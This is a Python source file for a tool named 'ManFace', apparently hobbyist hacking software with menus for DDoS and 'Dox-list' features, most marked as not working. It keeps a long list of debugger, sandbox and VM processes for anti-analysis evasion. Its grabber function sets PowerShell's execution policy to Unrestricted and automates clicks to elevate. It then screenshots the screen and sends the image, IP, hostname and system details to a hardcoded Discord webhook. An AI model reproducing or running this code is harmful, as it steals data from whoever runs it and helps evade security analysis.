import time
import threading
import os
import socket
import sys
import platform
import psutil
import pyautogui
import subprocess
import re
import uuid
import random
import bs4
import whois
import shutil
import dns.resolver
import urllib
import urllib.request
import requests, json
import colorama
import mac_vendor_lookup
import phonenumbers
from pynput import keyboard
from keyboard import write
from os.path import getctime, expanduser
from re import findall
from glob import glob
from mac_vendor_lookup import MacLookup
from phonenumbers import geocoder
from phonenumbers import carrier
from PIL import ImageGrab
from os import startfile
from random import randint
from getpass import getpass
from urllib.request import urlopen
from pytube import YouTube
from colorama import Fore
colorama.init()

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
cyan = Fore.CYAN
white = Fore.WHITE

ManFace_Test = False

serverConnected = False


time.sleep(3)
# Path to the .exe file
path = os.path.abspath("Helper/ManFaceAntiReverse.exe")

exe_path = path

# Start the .exe file
subprocess.Popen(exe_path)


blackListed = [
    ["ida64.exe",                   False],
    #["Discord.exe",                 False],
    ["ida32.exe",                   False],
    ["dnSpy.exe",                   False],
    ["OllyDbg.exe",                 False],
    ["IDA.exe",                     False],
    ["Ghidra.exe",                  False],
    ["x64dbg.exe",                  False],
    ["CheatEngine.exe",             False],
    ["Wireshark.exe",               False],
    ["procmon.exe",                 False],
    ["VBoxHeadless.exe",            False],
    ["VMware.exe",                  False],
    ["ollydbg64.exe",               False],
    ["ollydbg32.exe",               False],
    ["idaq.exe",                    False],
    ["idag.exe",                    False],
    ["ollydbg.exe",                 False],
    ["idaq64.exe",                  False],
    ["idaq32.exe",                  False],
    ["dbgview.exe",                 False],
    ["Fiddler.exe",                 False],
    ["Wireshark-gtk.exe",           False],
    ["Wireshark-qt.exe",            False],
    ["scylla_x86.exe",              False],
    ["scylla_x64.exe",              False],
    ["ScyllaHide.exe",              False],
    ["importREdir.exe",             False],
    ["HTTPDebuggerSvc.exe",         False],
    ["ollydgb.exe",                 False],
    ["HTTPDebugger.exe",            False],
    ["ResourceHacker.exe",          False],
    ["PEiD.exe",                    False],
    ["CFF Explorer.exe",            False],
    ["X64NetDumper.exe",            False],
    ["x32dbg.exe",                  False],
    ["HTTPDebuggerCL.exe",          False],
    ["DNFEver.exe",                 False],
    ["CodeInspector.exe",           False],
    ["ReClassEx.exe",               False],
    ["IMMUNITYDEBUGGER.exe",        False],
    ["windows-iodine.exe",          False],
    ["protection_id.exe",           False],
    ["W32Dasm.exe",                 False],
    ["exeinfope.exe",               False],
    ["MegaDumper.exe",              False],
    ["sandboxiedcomlaunch.exe",     False],
    ["SysInspector.exe",            False],
    ["ProcDot.exe",                 False],
    ["ProcessExplorer.exe",         False],
    ["UPXUnpacker.exe",             False],
    ["titanhide.exe",               False],
    ["WDASM.exe",                   False],
    ["WiresharkPortable.exe",       False],
    ["MMD.exe",                     False],
    ["WiresharkLegacy.exe",         False],
    ["fiddler4.exe",                False],
    ["TcpLogView.exe",              False],
    ["WPE_PRO.exe",                 False],
    ["Molebox.exe",                 False],
    ["VMWareTray.exe",              False],
    ["VMWareUser.exe",              False],
    ["FileMon.exe",                 False],
    ["Regmon.exe",                  False],
    ["autoruns.exe",                False],
    ["TCPView.exe",                 False],
    ["VMCheck.exe",                 False],
    ["DriverMon.exe",               False],
    ["DependencyWalker.exe",        False],
    ["exeshield.exe",               False],
    ["codeviewer.exe",              False],
    ["exespy.exe",                  False],
    ["idaq.exe",                    False],
    ["windbg.exe",                  False],
    ["softice.exe",                 False],
    ["lordpe.exe",                  False],
    ["petools.exe",                 False],
    ["Syser.exe",                   False],
    ["BoxInject.exe",               False],
    ["OLLYDDBG.exe",                False],
    ["ODBGScript.exe",              False],
    ["scylla.dll",                  False],
    ["KERNEL32.dll",                False],
    ["user32.dll",                  False],
    ["SbieSvc.exe",                 False],
    ["ApiInspector.exe",            False],
    ["PE Tools.exe",                False],
    ["exe2aut.exe",                 False],
    ["PE-bear.exe",                 False],
    ["UICEye.exe",                  False],
    ["PEID.exe",                    False],
    ["PEscanner.exe",               False],
    ["ollyattach.exe",              False],
    ["ollydump.exe",                False],
    ["immunitydebugger64.exe",      False],
    ["VMware-vmx.exe",              False],
    ["VMwareUser.exe",              False],
    ["VMwareService.exe",           False],
    ["procexp.exe",                 False],
    ["rammap.exe",                  False],
    ["apateDNS.exe",                False],
    ["jd-gui.exe",                  False],
    ["GDB.exe",                     False],
    ["DynamoRIO.exe",               False],
    ["DynamoRIOx86.dll",            False],
    ["DynamoRIOx64.dll",            False],
    ["ida.dll",                     False],
    ["dbg.exe",                     False],
    ["HexRaysCodeXplorer.exe",      False],
    ["ResourceHackerPortable.exe",  False],
    ["Scylla_x86_x64.exe",          False],
    ["DetectItEasy.exe",            False],
    ["objdump.exe",                 False],
    ["gdb.exe",                     False],
    ["idaq.exe",                    False],
    ["importREC.exe",               False],
    ["LIEF.exe",                    False],
    ["WPE Pro.exe",                 False],
    ["CheatEngine-i386.exe",        False],
    ["CheatEngine-x86_64.exe",      False],
    ["ImmunityDebugger.exe",        False],
    ["debugger.exe",                False],
    ["WINHEX.exe",                  False],
    ["x32dbg.exe",                  False],
    ["Sndcpy.exe",                  False],
    ["adb.exe",                     False],
    ["AndroidEmulator.exe",         False],
    ["x64dbg.exe",                  False],
    ["scrcpy.exe",                  False],
    ["CmdUtil.exe",                 False],
    ["GhidraRun.bat",               False],
    ["Tracealyzer.exe",             False],
    ["Python.exe",                  False],
    ["Ollyice.exe",                 False],
    ["hex-rays.com",                False],
    ["ImmunityDebuggerc.exe",       False],
    ["DnSpy.Console.exe",           False],
    ["DnSpy-x86.exe",               False],
    ["processhacker.exe",           False],
    ["AndroidEmulator-x86_64.exe",  False],
    ["Wireshark_x64.exe",           False],
    ["curl.exe",                    False],
    ["networkminer.exe",            False],
    ["dnSpy.x86_64.exe",            False],
    ["WDASM64.exe",                 False],
    ["ExeinfoPe64.exe",             False],
    ["ExeinfoPe.exe",               False],
    ["processexplorer64.exe",       False],
    ["sysinspector64.exe",          False],
    ["wdasm32.exe",                 False],
    ["tor.exe",                     False],
    ["nmap.exe",                    False],
    ["CheatEngineServer.exe",       False],
    ["scylla_x64.dll",              False],
    ["ProxyCap.exe",                False],
    ["Procmon64.exe",               False],
    ["WiresharkLauncher.exe",       False]
]

if ManFace_Test == True:
    def anti_reverse_live():
        if not is_admin():
            os.system(f"cls && title Anti-reverse-detection - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        if is_admin():
            os.system(f"cls && title Anti-reverse-detection - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        time.sleep(0.5)
        os.system("cls")
        def center_text(text):
            terminal_width, _ = shutil.get_terminal_size(fallback=(80, 24))

            if len(text) >= terminal_width:
                return text  # Text is longer than or equal to the terminal width

            padding = terminal_width - len(text)
            left_padding = padding // 2
            right_padding = padding - left_padding

            centered_text = " " * left_padding + text + " " * right_padding

            return centered_text

        # Example usage:
        for i in range(1, 100):
            os.system("cls")
            text_to_center = f"{red}[{white} Black listed program detected... {red}]{white} \n {red}[{white}Error1{red}]{white}"
            centered_text = center_text(text_to_center)
            print(centered_text)

        time.sleep(2.5)
        sys.exit()

    def download():
        link = "https://www.youtube.com/watch?v=MG2hEIrHsBQ&ab_channel=Themilkman1986"
        try:
            ytlink = link.get()
            ytObject = YouTube(ytlink)
            video = ytObject.streams.get_highest_resolution()
            video.download()
        except:
            print(f"{red}Error{white}")

    def is_admin():
        try:
            with open(os.path.join(os.environ["SystemRoot"], "test.txt"), "w") as test_file:
                test_file.write("This is a test")
            os.remove(os.path.join(os.environ["SystemRoot"], "test.txt"))
            return True
        except:
            return False

    def crashReport():
        crashText = f"Looks like ManFace_helper.exe ran into a probelm..."

    def phoneLookUp():
        print(f"{red}[{white} Comming soon {red}]{white}")
        time.sleep(2.5)
        menuPage1()

    def get_IPv4_address2():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ipv4_address = s.getsockname()[0]
            s.close()
            return ipv4_address
        except Exception as e:
            print("Error occurred while fetching IPv4 address:", e)
            return None

    def UserInfoWebhookSender():
        if not is_admin():
            os.system(f"cls && title Loading - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Loading - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        webhook = "https://discord.com/api/webhooks/1142595203090362510/jAzFvnIStPqUs40U_mhA3onoyg6kyOLN2yB-VVQFapFCd-BpJCibczddgMOG3NOw1Co0"
        
        #screenshot.save(screenshot_path)

        #os.remove(f"{os.path.abspath(screenshot_path)}")

        hostname2 = socket.gethostname()
        print(f"[{cyan}INFO{white}]Saved ip_address...")
        ip_address2 = socket.gethostbyname(hostname2)
        subprocess.Popen(["start", "PowerShell", "Set-ExecutionPolicy Unrestricted", "A"], shell = True)
        try:
            subprocess.run(["powershell.exe", "-Command", "Start-Process", "powershell.exe", "-Verb", "runAs"])
        except FileNotFoundError:
            print("PowerShell not found. Make sure PowerShell is installed.")

        time.sleep(1)
        pyautogui.click(1000, 700)
        pyautogui.hotkey("ctrlleft")
        time.sleep(0.5)
        keyboard.Key.enter

        #subprocess.Popen(["start", "cmd", "/k", "mstsc /console /v:" + adminPC], shell = True)
        time.sleep(0.3)

        screen_width, screen_height = pyautogui.size()
        screenshot = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))

        screenshot_path = "0x462.png"
        screenshot.save(screenshot_path)
        print(f"[{cyan}INFO{white}]Saved picture...")

        payload2 = {
            "file": (
                f"{os.path.abspath(screenshot_path)}", open(f"{os.path.abspath(screenshot_path)}", "rb")
            )
        }

        response = requests.post(webhook, files=payload2)

        if response.status_code == 204:
            time.sleep(0.1)

        screenshot.close()



        time.sleep(2)
        print(f"[{cyan}INFO{white}]Saved ip_address2...")

        system2 = platform.uname()
        print(f"[{cyan}INFO{white}]Saved system2...")
        cpu_info2 = platform.processor()
        print(f"[{cyan}INFO{white}]Saved cpu_info2...")
        memory2 = psutil.virtual_memory()
        print(f"[{cyan}INFO{white}]Saved memory2...")
        disk_partitions2 = psutil.disk_partitions()
        network_info2 = psutil.net_if_addrs()

        payload = {
            "embeds": [
                {
                    "title": "ManFace Grabber [BETA]",
                    "color": 0x008000,
                    "author": {"url": "https://cdn.discordapp.com/attachments/1063976441856917604/1141414523035713616/IMG_0407.jpg"},
                    "fields": [
                        {
                        "name": "┏[HOST-INFO]",
                        "value": f"┣━> [IP]: **{ip_address2}** \n┗━> [HOST]: **{hostname2}**",
                        "inline": False,
                        },

                        {"name": "┏[SYSTEM-INFO]",
                        "value": f"┣━> [OS]: **{system2.system}** \n┣━> [SYSTEM NODE]: **{system2.node}** \n┣━> [SYSTEM RELEASE]: **{system2.release}** \n┣━> [SYSTEM VERSION]: **{system2.version}** \n┗━> [SYSTEM MACHINE]: **{system2.machine}**",
                        "inline": False
                        },
                        {"name": "┏[SPECS-INFO]",
                        "value": f"┣━> [CPU]: **{cpu_info2}** \n┗━> [DISK PARTITIONS]: **{memory2.total}** bytes",
                        "inline": False
                        },
                        {"name": "┏[MANFACE-INFO]",
                        "value": f"┣━> [Onetime use MF Password]: **{Password}** \n┗━> []: **{memory2.total}**",
                        "inline": False
                        },
                    ],
                    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1142594881299173418/1175974503998836776/q22HDNY.jpg?ex=656d2e9a&is=655ab99a&hm=490125a74f3427eaa768c129b47eb63f4bbd35eb09aa9ebebf27da4b218084f8&"}
                }
            ]
        }
        print("")
        print(f"[{green}SUCCESS{white}]Sent saved data to discord webhook.")
        FailedPayload = {
            "embeds": [
                {
                    "title": "ManFace Grabber [BETA]",
                    "color": 0xFF0000,
                    "author": {"url": "https://cdn.discordapp.com/attachments/1063976441856917604/1141414523035713616/IMG_0407.jpg"},
                    "fields": [
                        {
                        "name": "┏[HOST-INFO]",
                        "value": f"┣━> [IP]: **error** \n┗━> [HOST]: **error**",
                        "inline": False,
                        },

                        {"name": "┏[SYSTEM-INFO]",
                        "value": f"┣━> [OS]: **error** \n┣━> [SYSTEM NODE]: **error** \n┣━> [SYSTEM RELEASE]: **error** \n┣━> [SYSTEM VERSION]: **error** \n┗━> [SYSTEM MACHINE]: **error**",
                        "inline": False
                        },
                        {"name": "┏[SPECS-INFO]",
                        "value": f"┣━> [CPU]: **error** \n┗━> [DISK PARTITIONS]: **error**",
                        "inline": False
                        },
                    ],
                    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1063976441856917604/1141414523035713616/IMG_0407.jpg"}
                }
            ]
        }
        headers = {
            "Content-Type": "application/json"
        }

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        response2 = requests.post(webhook, json=payload)

        def ManFaceRestart(file_path):
            try:
                subprocess.run(["python", file_path], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Error while running the file: {e}")
            except FileNotFoundError:
                print("File not found")
            except Exception as e:
                print(f"An error occurred: {str(e)}")

        if response2.status_code == 204:
            time.sleep(0.1)
        elif response2 == requests.ConnectionError:
            FailResponse2 = requests.post(webhook, json=FailedPayload)
            if FailResponse2.status_code == 400:
                time.sleep(0.1)
                restart = True
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 5 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 4 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 3 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 2 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 1 [close this if you do not wanna restart ManFace.exe]")
                print(f"[-] Preparing ManFace.exe")
                file_path = "C:\\Users\\nilsv\\Desktop\\Stuff\\CodingStuff\\Python_Projects\\MAN-FACE\\ManFaceV1.0.0\\MANFACE_admin.py"
                ManFaceRestart(file_path)
                time.sleep(1)
        time.sleep(2.5)

    ByeLove_text = f"""{Fore.MAGENTA}    ██████╗ ██╗   ██╗███████╗       ██╗      ██████╗ ██╗   ██╗███████╗
        ██╔══██╗╚██╗ ██╔╝██╔════╝       ██║     ██╔═══██╗██║   ██║██╔════╝
        ██████╔╝ ╚████╔╝ █████╗         ██║     ██║   ██║██║   ██║█████╗  
        ██╔══██╗  ╚██╔╝  ██╔══╝         ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  
        ██████╔╝   ██║   ███████╗▄█╗    ███████╗╚██████╔╝ ╚████╔╝ ███████╗
        ╚═════╝    ╚═╝   ╚══════╝╚═╝    ╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝{white}"""

    def exit_command():
        os.system("cls")
        print("    Do you wanna exit?")
        ByeLove = input("    Y/N: ")
        if ByeLove == "Y":
            time.sleep(0.5)
            os.system("cls")
            print(ByeLove_text)
            time.sleep(2)
            sys.exit(0)
        elif ByeLove == "y":
            time.sleep(0.5)
            os.system("cls")
            print(ByeLove_text)
            time.sleep(2)
            sys.exit(0)
        elif ByeLove == "N":
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif ByeLove == "n":
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        else:
            print(f"    {red}THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(2.5)
            os.system("cls")
            Layer4()

    def IP_grabber():
        os.system("cls")
        time.sleep(1)
        print("OPAEGJKAEIOFWEVIAHBUI")
        time.sleep(2.5)
        os.system("cls")
        onstart


    def Dox_list():
        hostname = socket.gethostname()
        Admin = "DESKTOP-OFALC7N"

        welcome5 = """
    Welcome To"""

        text5 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                    {white}ManFace{red}  :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                        ██████╗  ██████╗ ██╗  ██╗       ██╗     ██╗███████╗████████╗
                        ██╔══██╗██╔═══██╗╚██╗██╔╝       ██║     ██║██╔════╝╚══██╔══╝
                        ██║  ██║██║   ██║ ╚███╔╝ █████╗ ██║     ██║███████╗   ██║   
                        ██║  ██║██║   ██║ ██╔██╗ ╚════╝ ██║     ██║╚════██║   ██║   
                        ██████╔╝╚██████╔╝██╔╝ ██╗       ███████╗██║███████║   ██║   
                        ╚═════╝  ╚═════╝ ╚═╝  ╚═╝       ╚══════╝╚═╝╚══════╝   ╚═╝   
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}1{white}] {green}>{white} RVVZ                                                                      ┃
        ┃ [{cyan}2{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}3{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}4{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}5{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}6{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}7{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}8{white}] {green}>{white} Prev-page(1)                                                              ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3

        print(welcome5, text5)

        DoxCommand = input(f"""\n   ┏━━({hostname}-admin[{green}1{white}]Dox-list)━[$]
    ┗━$> """)
        
        if DoxCommand == "Exit":
            time.sleep(0.5)
            exit_command()
        elif DoxCommand == "exit":
            time.sleep(0.5)
            exit_command()
        elif DoxCommand == "1":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "2":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "3":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "4":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "5":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "6":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "7":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "8":
            time.sleep(0.5)
            menuPage2()

    def Layer7():
        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""
        Admin = "DESKTOP-OFALC7N"

        welcome4 = """
    Welcome To"""

        text4 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                            ██╗      █████╗ ██╗   ██╗███████╗██████╗      ███████╗
                            ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗     ╚════██║
                            ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝ █████╗  ██╔╝
                            ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗ ╚════╝ ██╔╝ 
                            ███████╗██║  ██║   ██║   ███████╗██║  ██║        ██║  
                            ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝        ╚═╝  
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}1{white}] {green}>{white} URL-ping                                                                  ┃
        ┃ [{cyan}2{white}] {green}>{white} URL-DDoS                                                                  ┃
        ┃ [{cyan}3{white}] {green}>{white} URL-To-Info                                                               ┃
        ┃ [{cyan}4{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}5{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}6{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}7{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}8{white}] {green}>{white} Prev-page(1)                                                              ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3

        print(welcome4, text4)
    
        L7Command = input(f"""\n   ┏━━({hostname}-admin[{green}1{white}]Layer-7)━[$]
    ┗━$> """)
        
        if L7Command == "Exit":
            time.sleep(0.5)
            exit_command()
        elif L7Command == "exit":
            time.sleep(0.5)
            exit_command()
        elif L7Command == "1":
            print("Does not work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "2":
            print("Does not work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "3":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "4":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "5":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "6":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "7":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "8":
            time.sleep(0.5)
            os.system("cls")
            onstart()
        else:
            print(f"{red}    THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(0.5)
            os.system("cls")
            Layer7()


    def Layer4():
        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""

        welcome3 = """
    Welcome To"""

        text3 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                        ██╗      █████╗ ██╗   ██╗███████╗██████╗         ██╗  ██╗
                        ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗        ██║  ██║
                        ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝ █████╗ ███████║
                        ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗ ╚════╝ ╚════██║
                        ███████╗██║  ██║   ██║   ███████╗██║  ██║             ██║
                        ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝             ╚═╝
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}1{white}] {green}>{white} IPv4-ping                                                                 ┃
        ┃ [{cyan}2{white}] {green}>{white} IPv4-DDoS                                                                 ┃
        ┃ [{cyan}3{white}] {green}>{white} IPv4-To-Info                                                              ┃
        ┃ [{cyan}4{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}5{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}6{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}7{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}8{white}] {green}>{white} Prev-page(1)                                                              ┃
